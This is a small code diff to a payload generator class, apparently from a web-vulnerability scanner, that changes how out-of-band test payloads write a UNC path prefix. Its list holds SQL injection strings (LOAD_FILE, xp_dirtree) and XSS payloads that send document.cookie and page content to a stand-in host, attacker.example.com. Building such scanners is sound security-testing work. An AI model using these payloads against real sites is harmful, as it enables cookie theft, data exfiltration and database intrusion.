@@ -213,10 +213,11 @@ class PayloadVariantGenerator:
     def get_oob_variants(self, base_payload: str, callback_url: str = '') -> List[str]:
         """Generate out-of-band detection variants."""
         cb = callback_url or 'http://attacker.example.com'
+        unc_path = r'\\\\'  # UNC path prefix: \\
         return [
-            f"' OR 1=1 AND LOAD_FILE('\\\\\\\\{cb}\\\\x')--",
+            f"' OR 1=1 AND LOAD_FILE('{unc_path}{cb}\\x')--",
             f"'; EXEC master..xp_dirtree '//{cb}/x'--",
-            f"'+UNION+SELECT+LOAD_FILE('\\\\\\\\{cb}\\\\x')--",
+            f"'+UNION+SELECT+LOAD_FILE('{unc_path}{cb}\\x')--",
             f'<img src=x onerror="fetch(\'{cb}/?c=\'+document.cookie)">',
             f"javascript:fetch('{cb}/?x='+btoa(document.body.innerHTML))",
         ]
